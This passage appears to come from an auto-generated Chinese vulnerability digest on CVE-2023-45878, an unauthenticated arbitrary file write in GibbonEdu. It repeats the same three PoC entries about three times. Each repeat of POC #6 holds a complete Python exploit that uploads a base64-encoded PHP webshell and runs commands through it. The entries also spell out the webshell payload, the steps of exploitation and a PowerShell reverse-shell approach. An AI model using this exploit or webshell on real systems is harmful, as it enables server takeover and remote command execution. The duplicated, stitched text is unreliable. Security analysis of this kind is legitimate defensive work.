    p_resp = requests.post(f"{args.url}/{endpoint}", headers=headers, data=payload)
    if p_resp.status_code!=200:
        print("[Err] Exploit failed!")
        sys.exit(-1)
    g_resp = requests.get(f"{args.url}/{payload_file}.php", params={"cmd":"whoami"})
    print(f"Got Webshell {args.url}/{payload_file}.php?cmd=whoami")
    print(g_resp.text)

if __name__ == '__main__':
    main()
```

该POC脚本首先生成一个随机的文件名，然后构造包含恶意PHP代码的payload，将payload发送到目标端点，如果写入成功，则通过GET请求访问写入的PHP文件并执行`whoami`命令，最后输出命令执行的结果。

**项目地址:** [killercd/CVE-2023-45878](https://github.com/killercd/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #7

**来源**: [CVE-2023-45878-nrazv_CVE-2023-45878.md](../2023/CVE-2023-45878-nrazv_CVE-2023-45878.md)

## CVE-2023-45878-GibbonEdu-任意文件写入

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要目标系统运行GibbonEdu，且漏洞页面可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878是GibbonEdu 25.0.1及之前版本中的一个任意文件写入漏洞。该漏洞位于`rubrics_visualise_saveAjax.php`，该文件无需身份验证即可访问。攻击者可以通过POST请求，利用`img`、`path`和`gibbonPersonID`参数，将恶意PHP代码写入服务器上的任意位置。其中`img`参数是base64编码的图像数据，`path`参数指定写入的文件路径，与安装目录的绝对路径连接。攻击者可以利用这个漏洞上传webshell，从而实现远程代码执行。

**有效性：**
提供的POC代码有效。从搜索引擎结果和漏洞库信息来看，该漏洞允许未授权用户写入任意文件，结合POC代码，其利用方式是通过构造特定的POST请求，将包含PHP恶意代码的base64编码数据写入指定的文件路径。POC代码中包含用于生成Windows反向shell的powershell脚本。

**投毒风险：**
POC代码的投毒风险较低，约为10%。主要风险点在于：
1.  **powershell脚本:**POC代码中生成了Windows反向shell的powershell脚本,如果目标环境并非预期，可能会导致攻击者在不知情的情况下连接到恶意服务器。
2.  **文件服务器:**POC运行了一个文件服务器，可能存在其他安全问题，虽然代码里只是用来传输powershell脚本,仍然存在一定风险

**利用方式：**
1.  目标系统运行GibbonEdu 25.0.1或更早版本。
2.  攻击者通过POST请求访问`rubrics_visualise_saveAjax.php`，构造恶意的`img`和`path`参数。
3.  `img`参数包含base64编码的PHP恶意代码，例如`<?php echo system($_GET['cmd']); ?>`，`path`参数指定webshell的文件名，例如`shell.php`。
4.  服务器将解码后的PHP代码写入指定的文件路径，例如`/modules/Rubrics/shell.php`。
5.  攻击者通过访问`/modules/Rubrics/shell.php?cmd=恶意命令`执行任意命令。
6. POC生成一个powershell脚本用于反向连接，并通过建立http服务供目标服务器下载
7.  POC利用webshell执行powershell命令，从http服务下载生成的powershell脚本。

**项目地址:** [nrazv/CVE-2023-45878](https://github.com/nrazv/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #8

**来源**: [CVE-2023-45878-ulricvbs_gibbonlms-filewrite_rce.md](../2023/CVE-2023-45878-ulricvbs_gibbonlms-filewrite_rce.md)

## CVE-2023-45878-GibbonEdu-任意文件写入/RCE

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入/远程代码执行

**影响应用:** GibbonEdu

**危害等级:** 高危，可导致服务器被完全控制

**影响版本:** <= 25.0.1

**利用条件:** 需要目标服务器运行存在漏洞的GibbonEdu系统，并能通过HTTP访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878是GibbonEdu 25.0.1及更早版本中存在的任意文件写入漏洞。该漏洞位于`rubrics_visualise_saveAjax.php`文件中，由于此文件没有进行身份验证，攻击者可以通过构造恶意的HTTP POST请求，利用`img`、`path`和`gibbonPersonID`参数，将任意PHP代码写入服务器。攻击者通过设置`path`参数指定文件保存路径，并将包含恶意代码的base64编码内容放在`img`参数中，服务器会将base64解码后的内容写入指定路径，从而实现任意文件写入。写入的PHP文件允许未经身份验证的远程代码执行。

**漏洞利用方式：**
1.  攻击者发送一个POST请求到`/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`。
2.  在POST请求中，`img`参数包含base64编码的PHP webshell代码，`path`参数指定webshell的文件名，`gibbonPersonID`参数可以设置为任意值。
3.  服务器接收到请求后，将`img`参数中的base64编码数据解码，然后将其写入到通过`path`参数指定的文件中。
4.  攻击者随后可以通过访问webshell文件，执行任意系统命令，从而控制服务器。

**POC代码分析：**
POC代码`gibbonlms_cmd_shell.py`实现了一个简单的交互式命令行shell。它首先上传一个包含`system($_GET['cmd'])`的PHP webshell，然后允许用户通过输入命令与webshell进行交互。如果webshell被删除，脚本会自动重新上传webshell。

**投毒风险分析：**
该POC代码主要功能是利用漏洞上传webshell并提供交互式界面。潜在的投毒风险较低，但是仍存在一些可能性：

*   **依赖风险：** 代码依赖`requests`库，如果`requests`库本身被投毒，可能影响POC的安全性。
*   **后门风险：** 作者可能在webshell中加入隐蔽的后门代码，例如，记录用户输入的命令或将服务器信息发送到外部服务器，但从当前代码来看，没有明显的后门特征。风险评估为10%。
*   **误用风险：** 该脚本明确声明用于教育目的，但如果被恶意使用者利用，可能造成严重危害。脚本的广泛传播可能增加漏洞被利用的风险。

综合来看，该POC的投毒风险较低，主要风险在于误用和对`requests`库的依赖。

**项目地址:** [ulricvbs/gibbonlms-filewrite_rce](https://github.com/ulricvbs/gibbonlms-filewrite_rce)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---



---

## POC #6

**来源**: [CVE-2023-45878-killercd_CVE-2023-45878.md](../2023/CVE-2023-45878-killercd_CVE-2023-45878.md)

## CVE-2023-45878-GibbonEdu-Arbitrary File Write

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要网络访问，目标系统开启了GibbonEdu服务

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-45878是GibbonEdu 25.0.1及之前版本中存在的任意文件写入漏洞。攻击者无需身份验证即可利用该漏洞，通过向`modules/Rubrics/rubrics_visualise_saveAjax.php`发送特制的POST请求，其中`img`参数包含base64编码的恶意PHP代码，`path`参数指定写入的文件名。由于程序没有进行严格的验证，攻击者可以将恶意PHP代码写入Web目录，从而实现远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞的POC代码是有效的。POC代码模拟了攻击过程，通过POST请求向目标URL的`modules/Rubrics/rubrics_visualise_saveAjax.php`发送恶意数据，成功写入PHP文件。

**投毒风险：**
经过对POC代码的分析，未发现明显的投毒代码。该脚本的主要功能是利用漏洞在目标系统上写入一个包含命令执行功能的PHP文件，然后通过GET请求执行命令。没有发现任何作者隐藏的恶意行为，例如反向shell、数据窃取或其他未经授权的操作，因此投毒风险评估为0%。

**利用方式：**
1.  构造包含恶意PHP代码的base64编码字符串，例如用于执行系统命令的代码。
2.  构造POST请求，设置`img`参数为base64编码的恶意PHP代码，`path`参数为期望写入的文件名（通常是PHP后缀）。
3.  发送POST请求到`modules/Rubrics/rubrics_visualise_saveAjax.php`。
4.  如果写入成功，通过GET请求访问写入的PHP文件，并传递`cmd`参数来执行系统命令。

利用示例（基于提供的POC代码）：

```python
import requests
import sys
import random
import argparse
import string


def main():

    payload_file = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    endpoint = "modules/Rubrics/rubrics_visualise_saveAjax.php"
    payload = {
        "img":f"image/png;{payload_file},PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4=",
        "path":f"{payload_file}.php",
        "gibbonPersonID":"0000000001"

    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"

    }
    parser = argparse.ArgumentParser(description="GibbonEdu Gibbon version 25.0.1 Arbitrary File Write")
    parser.add_argument("url", type=str, help="Gibbon URL")
    args = parser.parse_args()

  
  
    print("Exploiting ...")
    print(f"{args.url}/{endpoint}")
    p_resp = requests.post(f"{args.url}/{endpoint}", headers=headers, data=payload)
    if p_resp.status_code!=200:
        print("[Err] Exploit failed!")
        sys.exit(-1)
    g_resp = requests.get(f"{args.url}/{payload_file}.php", params={"cmd":"whoami"})
    print(f"Got Webshell {args.url}/{payload_file}.php?cmd=whoami")
    print(g_resp.text)

if __name__ == '__main__':
    main()
```

该POC脚本首先生成一个随机的文件名，然后构造包含恶意PHP代码的payload，将payload发送到目标端点，如果写入成功，则通过GET请求访问写入的PHP文件并执行`whoami`命令，最后输出命令执行的结果。

**项目地址:** [killercd/CVE-2023-45878](https://github.com/killercd/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #7

**来源**: [CVE-2023-45878-nrazv_CVE-2023-45878.md](../2023/CVE-2023-45878-nrazv_CVE-2023-45878.md)

## CVE-2023-45878-GibbonEdu-任意文件写入

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要目标系统运行GibbonEdu，且漏洞页面可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878是GibbonEdu 25.0.1及之前版本中的一个任意文件写入漏洞。该漏洞位于`rubrics_visualise_saveAjax.php`，该文件无需身份验证即可访问。攻击者可以通过POST请求，利用`img`、`path`和`gibbonPersonID`参数，将恶意PHP代码写入服务器上的任意位置。其中`img`参数是base64编码的图像数据，`path`参数指定写入的文件路径，与安装目录的绝对路径连接。攻击者可以利用这个漏洞上传webshell，从而实现远程代码执行。

**有效性：**
提供的POC代码有效。从搜索引擎结果和漏洞库信息来看，该漏洞允许未授权用户写入任意文件，结合POC代码，其利用方式是通过构造特定的POST请求，将包含PHP恶意代码的base64编码数据写入指定的文件路径。POC代码中包含用于生成Windows反向shell的powershell脚本。

**投毒风险：**
POC代码的投毒风险较低，约为10%。主要风险点在于：
1.  **powershell脚本:**POC代码中生成了Windows反向shell的powershell脚本,如果目标环境并非预期，可能会导致攻击者在不知情的情况下连接到恶意服务器。
2.  **文件服务器:**POC运行了一个文件服务器，可能存在其他安全问题，虽然代码里只是用来传输powershell脚本,仍然存在一定风险

**利用方式：**
1.  目标系统运行GibbonEdu 25.0.1或更早版本。
2.  攻击者通过POST请求访问`rubrics_visualise_saveAjax.php`，构造恶意的`img`和`path`参数。
3.  `img`参数包含base64编码的PHP恶意代码，例如`<?php echo system($_GET['cmd']); ?>`，`path`参数指定webshell的文件名，例如`shell.php`。
4.  服务器将解码后的PHP代码写入指定的文件路径，例如`/modules/Rubrics/shell.php`。
5.  攻击者通过访问`/modules/Rubrics/shell.php?cmd=恶意命令`执行任意命令。
6. POC生成一个powershell脚本用于反向连接，并通过建立http服务供目标服务器下载
7.  POC利用webshell执行powershell命令，从http服务下载生成的powershell脚本。

**项目地址:** [nrazv/CVE-2023-45878](https://github.com/nrazv/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #8

**来源**: [CVE-2023-45878-ulricvbs_gibbonlms-filewrite_rce.md](../2023/CVE-2023-45878-ulricvbs_gibbonlms-filewrite_rce.md)

## CVE-2023-45878-GibbonEdu-任意文件写入/RCE

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入/远程代码执行

**影响应用:** GibbonEdu

**危害等级:** 高危，可导致服务器被完全控制

**影响版本:** <= 25.0.1

**利用条件:** 需要目标服务器运行存在漏洞的GibbonEdu系统，并能通过HTTP访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878是GibbonEdu 25.0.1及更早版本中存在的任意文件写入漏洞。该漏洞位于`rubrics_visualise_saveAjax.php`文件中，由于此文件没有进行身份验证，攻击者可以通过构造恶意的HTTP POST请求，利用`img`、`path`和`gibbonPersonID`参数，将任意PHP代码写入服务器。攻击者通过设置`path`参数指定文件保存路径，并将包含恶意代码的base64编码内容放在`img`参数中，服务器会将base64解码后的内容写入指定路径，从而实现任意文件写入。写入的PHP文件允许未经身份验证的远程代码执行。

**漏洞利用方式：**
1.  攻击者发送一个POST请求到`/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`。
2.  在POST请求中，`img`参数包含base64编码的PHP webshell代码，`path`参数指定webshell的文件名，`gibbonPersonID`参数可以设置为任意值。
3.  服务器接收到请求后，将`img`参数中的base64编码数据解码，然后将其写入到通过`path`参数指定的文件中。
4.  攻击者随后可以通过访问webshell文件，执行任意系统命令，从而控制服务器。

**POC代码分析：**
POC代码`gibbonlms_cmd_shell.py`实现了一个简单的交互式命令行shell。它首先上传一个包含`system($_GET['cmd'])`的PHP webshell，然后允许用户通过输入命令与webshell进行交互。如果webshell被删除，脚本会自动重新上传webshell。

**投毒风险分析：**
该POC代码主要功能是利用漏洞上传webshell并提供交互式界面。潜在的投毒风险较低，但是仍存在一些可能性：

*   **依赖风险：** 代码依赖`requests`库，如果`requests`库本身被投毒，可能影响POC的安全性。
*   **后门风险：** 作者可能在webshell中加入隐蔽的后门代码，例如，记录用户输入的命令或将服务器信息发送到外部服务器，但从当前代码来看，没有明显的后门特征。风险评估为10%。
*   **误用风险：** 该脚本明确声明用于教育目的，但如果被恶意使用者利用，可能造成严重危害。脚本的广泛传播可能增加漏洞被利用的风险。

综合来看，该POC的投毒风险较低，主要风险在于误用和对`requests`库的依赖。

**项目地址:** [ulricvbs/gibbonlms-filewrite_rce](https://github.com/ulricvbs/gibbonlms-filewrite_rce)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---



---

## POC #6

**来源**: [CVE-2023-45878-killercd_CVE-2023-45878.md](../2023/CVE-2023-45878-killercd_CVE-2023-45878.md)

## CVE-2023-45878-GibbonEdu-Arbitrary File Write

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要网络访问，目标系统开启了GibbonEdu服务

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-45878是GibbonEdu 25.0.1及之前版本中存在的任意文件写入漏洞。攻击者无需身份验证即可利用该漏洞，通过向`modules/Rubrics/rubrics_visualise_saveAjax.php`发送特制的POST请求，其中`img`参数包含base64编码的恶意PHP代码，`path`参数指定写入的文件名。由于程序没有进行严格的验证，攻击者可以将恶意PHP代码写入Web目录，从而实现远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞的POC代码是有效的。POC代码模拟了攻击过程，通过POST请求向目标URL的`modules/Rubrics/rubrics_visualise_saveAjax.php`发送恶意数据，成功写入PHP文件。

**投毒风险：**
经过对POC代码的分析，未发现明显的投毒代码。该脚本的主要功能是利用漏洞在目标系统上写入一个包含命令执行功能的PHP文件，然后通过GET请求执行命令。没有发现任何作者隐藏的恶意行为，例如反向shell、数据窃取或其他未经授权的操作，因此投毒风险评估为0%。

**利用方式：**
1.  构造包含恶意PHP代码的base64编码字符串，例如用于执行系统命令的代码。
2.  构造POST请求，设置`img`参数为base64编码的恶意PHP代码，`path`参数为期望写入的文件名（通常是PHP后缀）。
3.  发送POST请求到`modules/Rubrics/rubrics_visualise_saveAjax.php`。
4.  如果写入成功，通过GET请求访问写入的PHP文件，并传递`cmd`参数来执行系统命令。

利用示例（基于提供的POC代码）：

```python
import requests
import sys
import random
import argparse
import string


def main():

    payload_file = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    endpoint = "modules/Rubrics/rubrics_visualise_saveAjax.php"
    payload = {
        "img":f"image/png;{payload_file},PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4=",
        "path":f"{payload_file}.php",
        "gibbonPersonID":"0000000001"

    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"

    }
    parser = argparse.ArgumentParser(description="GibbonEdu Gibbon version 25.0.1 Arbitrary File Write")
    parser.add_argument("url", type=str, help="Gibbon URL")
    args = parser.parse_args()

  
  
    print("Exploiting ...")
    print(f"{args.url}/{endpoint}")
    p_resp = requests.post(f"{args.url}/{endpoint}", headers=headers, data=payload)
    if p_resp.status_code!=200:
        print("[Err] Exploit failed!")
        sys.exit(-1)
    g_resp = requests.get(f"{args.url}/{payload_file}.php", params={"cmd":"whoami"})
    print(f"Got Webshell {args.url}/{payload_file}.php?cmd=whoami")
    print(g_resp.text)

if __name__ == '__main__':
    main()
```

该POC脚本首先生成一个随机的文件名，然后构造包含恶意PHP代码的payload，将payload发送到目标端点，如果写入成功，则通过GET请求访问写入的PHP文件并执行`whoami`命令，最后输出命令执行的结果。

**项目地址:** [killercd/CVE-2023-45878](https://github.com/killercd/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #7

**来源**: [CVE-2023-45878-nrazv_CVE-2023-45878.md](../2023/CVE-2023-45878-nrazv_CVE-2023-45878.md)

## CVE-2023-45878-GibbonEdu-任意文件写入

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要目标系统运行GibbonEdu，且漏洞页面可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878是GibbonEdu 25.0.1及之前版本中的一个任意文件写入漏洞。该漏洞位于`rubrics_visualise_saveAjax.php`，该文件无需身份验证即可访问。攻击者可以通过POST请求，利用`img`、`path`和`gibbonPersonID`参数，将恶意PHP代码写入服务器上的任意位置。其中`img`参数是base64编码的图像数据，`path`参数指定写入的文件路径，与安装目录的绝对路径连接。攻击者可以利用这个漏洞上传webshell，从而实现远程代码执行。

**有效性：**
提供的POC代码有效。从搜索引擎结果和漏洞库信息来看，该漏洞允许未授权用户写入任意文件，结合POC代码，其利用方式是通过构造特定的POST请求，将包含PHP恶意代码的base64编码数据写入指定的文件路径。POC代码中包含用于生成Windows反向shell的powershell脚本。

**投毒风险：**
POC代码的投毒风险较低，约为10%。主要风险点在于：
1.  **powershell脚本:**POC代码中生成了Windows反向shell的powershell脚本,如果目标环境并非预期，可能会导致攻击者在不知情的情况下连接到恶意服务器。
2.  **文件服务器:**POC运行了一个文件服务器，可能存在其他安全问题，虽然代码里只是用来传输powershell脚本,仍然存在一定风险

**利用方式：**
1.  目标系统运行GibbonEdu 25.0.1或更早版本。
2.  攻击者通过POST请求访问`rubrics_visualise_saveAjax.php`，构造恶意的`img`和`path`参数。
3.  `img`参数包含base64编码的PHP恶意代码，例如`<?php echo system($_GET['cmd']); ?>`，`path`参数指定webshell的文件名，例如`shell.php`。
4.  服务器将解码后的PHP代码写入指定的文件路径，例如`/modules/Rubrics/shell.php`。
5.  攻击者通过访问`/modules/Rubrics/shell.php?cmd=恶意命令`执行任意命令。
6. POC生成一个powershell脚本用于反向连接，并通过建立http服务供目标服务器下载
7.  POC利用webshell执行powershell命令，从http服务下载生成的powershell脚本。

**项目地址:** [nrazv/CVE-2023-45878](https://github.com/nrazv/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #8

**来源**: [CVE-2023-45878-ulricvbs_gibbonlms-filewrite_rce.md](../2023/CVE-2023-45878-ulricvbs_gibbonlms-filewrite_rce.md)

## CVE-2023-45878-GibbonEdu-任意文件写入/RCE

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入/远程代码执行

**影响应用:** GibbonEdu

**危害等级:** 高危，可导致服务器被完全控制

**影响版本:** <= 25.0.1

**利用条件:** 需要目标服务器运行存在漏洞的GibbonEdu系统，并能通过HTTP访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878是GibbonEdu 25.0.1及更早版本中存在的任意文件写入漏洞。该漏洞位于`rubrics_visualise_saveAjax.php`文件中，由于此文件没有进行身份验证，攻击者可以通过构造恶意的HTTP POST请求，利用`img`、`path`和`gibbonPersonID`参数，将任意PHP代码写入服务器。攻击者通过设置`path`参数指定文件保存路径，并将包含恶意代码的base64编码内容放在`img`参数中，服务器会将base64解码后的内容写入指定路径，从而实现任意文件写入。写入的PHP文件允许未经身份验证的远程代码执行。

**漏洞利用方式：**
1.  攻击者发送一个POST请求到`/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`。
2.  在POST请求中，`img`参数包含base64编码的PHP webshell代码，`path`参数指定webshell的文件名，`gibbonPersonID`参数可以设置为任意值。
3.  服务器接收到请求后，将`img`参数中的base64编码数据解码，然后将其写入到通过`path`参数指定的文件中。
4.  攻击者随后可以通过访问webshell文件，执行任意系统命令，从而控制服务器。

**POC代码分析：**
POC代码`gibbonlms_cmd_shell.py`实现了一个简单的交互式命令行shell。它首先上传一个包含`system($_GET['cmd'])`的PHP webshell，然后允许用户通过输入命令与webshell进行交互。如果webshell被删除，脚本会自动重新上传webshell。

**投毒风险分析：**
该POC代码主要功能是利用漏洞上传webshell并提供交互式界面。潜在的投毒风险较低，但是仍存在一些可能性：

*   **依赖风险：** 代码依赖`requests`库，如果`requests`库本身被投毒，可能影响POC的安全性。
*   **后门风险：** 作者可能在webshell中加入隐蔽的后门代码，例如，记录用户输入的命令或将服务器信息发送到外部服务器，但从当前代码来看，没有明显的后门特征。风险评估为10%。
*   **误用风险：** 该脚本明确声明用于教育目的，但如果被恶意使用者利用，可能造成严重危害。脚本的广泛传播可能增加漏洞被利用的风险。

综合来看，该POC的投毒风险较低，主要风险在于误用和对`requests`库的依赖。

**项目地址:** [ulricvbs/gibbonlms-filewrite_rce](https://github.com/ulricvbs/gibbonlms-filewrite_rce)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---



---

## POC #6

**来源**: [CVE-2023-45878-killercd_CVE-2023-45878.md](../2023/CVE-2023-45878-killercd_CVE-2023-45878.md)

## CVE-2023-45878-GibbonEdu-Arbitrary File Write

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要网络访问，目标系统开启了GibbonEdu服务

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-45878是GibbonEdu 25.0.1及之前版本中存在的任意文件写入漏洞。攻击者无需身份验证即可利用该漏洞，通过向`modules/Rubrics/rubrics_visualise_saveAjax.php`发送特制的POST请求，其中`img`参数包含base64编码的恶意PHP代码，`path`参数指定写入的文件名。由于程序没有进行严格的验证，攻击者可以将恶意PHP代码写入Web目录，从而实现远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞的POC代码是有效的。POC代码模拟了攻击过程，通过POST请求向目标URL的`modules/Rubrics/rubrics_visualise_saveAjax.php`发送恶意数据，成功写入PHP文件。

**投毒风险：**
经过对POC代码的分析，未发现明显的投毒代码。该脚本的主要功能是利用漏洞在目标系统上写入一个包含命令执行功能的PHP文件，然后通过GET请求执行命令。没有发现任何作者隐藏的恶意行为，例如反向shell、数据窃取或其他未经授权的操作，因此投毒风险评估为0%。

**利用方式：**
1.  构造包含恶意PHP代码的base64编码字符串，例如用于执行系统命令的代码。
2.  构造POST请求，设置`img`参数为base64编码的恶意PHP代码，`path`参数为期望写入的文件名（通常是PHP后缀）。
3.  发送POST请求到`modules/Rubrics/rubrics_visualise_saveAjax.php`。
4.  如果写入成功，通过GET请求访问写入的PHP文件，并传递`cmd`参数来执行系统命令。

利用示例（基于提供的POC代码）：

```python
import requests
import sys
import random
import argparse
import string


def main():

    payload_file = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    endpoint = "modules/Rubrics/rubrics_visualise_saveAjax.php"
    payload = {
        "img":f"image/png;{payload_file},PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4=",
        "path":f"{payload_file}.php",
        "gibbonPersonID":"0000000001"

    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"

    }
    parser = argparse.ArgumentParser(description="GibbonEdu Gibbon version 25.0.1 Arbitrary File Write")
    parser.add_argument("url", type=str, help="Gibbon URL")
    args = parser.parse_args()

  
  
    print("Exploiting ...")
    print(f"{args.url}/{endpoint}")
    p_resp = requests.post(f"{args.url}/{endpoint}", headers=headers, data=payload)
    if p_resp.status_code!=200:
        print("[Err] Exploit failed!")
        sys.exit(-1)
    g_resp = requests.get(f"{args.url}/{payload_file}.php", params={"cmd":"whoami"})
    print(f"Got Webshell {args.url}/{payload_file}.php?cmd=whoami")
    print(g_resp.text)

if __name__ == '__main__':
    main()
```

该POC脚本首先生成一个随机的文件名，然后构造包含恶意PHP代码的payload，将payload发送到目标端点，如果写入成功，则通过GET请求访问写入的PHP文件并执行`whoami`命令，最后输出命令执行的结果。

**项目地址:** [killercd/CVE-2023-45878](https://github.com/killercd/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #7

**来源**: [CVE-2023-45878-nrazv_CVE-2023-45878.md](../2023/CVE-2023-45878-nrazv_CVE-2023-45878.md)

## CVE-2023-45878-GibbonEdu-任意文件写入

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要目标系统运行GibbonEdu，且漏洞页面可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878是GibbonEdu 25.0.1及之前版本中的一个任意文件写入漏洞。该漏洞位于`rubrics_visualise_saveAjax.php`，该文件无需身份验证即可访问。攻击者可以通过POST请求，利用`img`、`path`和`gibbonPersonID`参数，将恶意PHP代码写入服务器上的任意位置。其中`img`参数是base64编码的图像数据，`path`参数指定写入的文件路径，与安装目录的绝对路径连接。攻击者可以利用这个漏洞上传webshell，从而实现远程代码执行。

**有效性：**
提供的POC代码有效。从搜索引擎结果和漏洞库信息来看，该漏洞允许未授权用户写入任意文件，结合POC代码，其利用方式是通过构造特定的POST请求，将包含PHP恶意代码的base64编码数据写入指定的文件路径。POC代码中包含用于生成Windows反向shell的powershell脚本。

**投毒风险：**
POC代码的投毒风险较低，约为10%。主要风险点在于：
1.  **powershell脚本:**POC代码中生成了Windows反向shell的powershell脚本,如果目标环境并非预期，可能会导致攻击者在不知情的情况下连接到恶意服务器。
2.  **文件服务器:**POC运行了一个文件服务器，可能存在其他安全问题，虽然代码里只是用来传输powershell脚本,仍然存在一定风险

**利用方式：**
1.  目标系统运行GibbonEdu 25.0.1或更早版本。
2.  攻击者通过POST请求访问`rubrics_visualise_saveAjax.php`，构造恶意的`img`和`path`参数。
3.  `img`参数包含base64编码的PHP恶意代码，例如`<?php echo system($_GET['cmd']); ?>`，`path`参数指定webshell的文件名，例如`shell.php`。
4.  服务器将解码后的PHP代码写入指定的文件路径，例如`/modules/Rubrics/shell.php`。
5.  攻击者通过访问`/modules/Rubrics/shell.php?cmd=恶意命令`执行任意命令。
6. POC生成一个powershell脚本用于反向连接，并通过建立http服务供目标服务器下载
7.  POC利用webshell执行powershell命令，从http服务下载生成的powershell脚本。

**项目地址:** [nrazv/CVE-2023-45878](https://github.com/nrazv/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #8

**来源**: [CVE-2023-45878-ulricvbs_gibbonlms-filewrite_rce.md](../2023/CVE-2023-45878-ulricvbs_gibbonlms-filewrite_rce.md)

## CVE-2023-45878-GibbonEdu-任意文件写入/RCE

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入/远程代码执行

**影响应用:** GibbonEdu

**危害等级:** 高危，可导致服务器被完全控制

**影响版本:** <= 25.0.1

**利用条件:** 需要目标服务器运行存在漏洞的GibbonEdu系统，并能通过HTTP访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878是GibbonEdu 25.0.1及更早版本中存在的任意文件写入漏洞。该漏洞位于`rubrics_visualise_saveAjax.php`文件中，由于此文件没有进行身份验证，攻击者可以通过构造恶意的HTTP POST请求，利用`img`、`path`和`gibbonPersonID`参数，将任意PHP代码写入服务器。攻击者通过设置`path`参数指定文件保存路径，并将包含恶意代码的base64编码内容放在`img`参数中，服务器会将base64解码后的内容写入指定路径，从而实现任意文件写入。写入的PHP文件允许未经身份验证的远程代码执行。

**漏洞利用方式：**
1.  攻击者发送一个POST请求到`/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`。
2.  在POST请求中，`img`参数包含base64编码的PHP webshell代码，`path`参数指定webshell的文件名，`gibbonPersonID`参数可以设置为任意值。
3.  服务器接收到请求后，将`img`参数中的base64编码数据解码，然后将其写入到通过`path`参数指定的文件中。
4.  攻击者随后可以通过访问webshell文件，执行任意系统命令，从而控制服务器。

**POC代码分析：**
POC代码`gibbonlms_cmd_shell.py`实现了一个简单的交互式命令行shell。它首先上传一个包含`system($_GET['cmd'])`的PHP webshell，然后允许用户通过输入命令与webshell进行交互。如果webshell被删除，脚本会自动重新上传webshell。

**投毒风险分析：**
该POC代码主要功能是利用漏洞上传webshell并提供交互式界面。潜在的投毒风险较低，但是仍存在一些可能性：

